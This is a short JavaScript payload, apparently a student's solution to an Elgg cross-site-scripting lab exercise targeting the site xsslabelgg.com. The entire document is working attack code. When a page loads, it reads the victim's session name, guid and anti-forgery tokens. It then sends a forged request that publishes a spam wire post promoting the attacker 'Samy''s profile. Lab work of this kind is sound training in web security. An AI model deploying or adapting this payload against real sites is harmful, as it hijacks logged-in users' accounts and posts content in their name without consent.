<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		var name = "&name=" + elgg.session.user.name;
		var guid = "&guid=" + elgg.session.user.guid;

		//and Security Token __elgg_token
		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

		
		//Got from browser inspect element --> Network --> Params --> Form Data --> guid
		var samy_guid = 47;
		//current user guid got from printing elgg object
		var current_user_guid = elgg.session.user.guid;

		//Construct the content of wire post url.
	    var sendurl = "http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	    //checked POST request header of the profile/edit request and then concatenate accordingly using the syntax from there
	    var body = "&body=To earn 12 USD/hour(!), visit now http\://www.xsslabelgg.com/profile/samy"
		var content = token + ts + body;
		
		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to post in wire
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>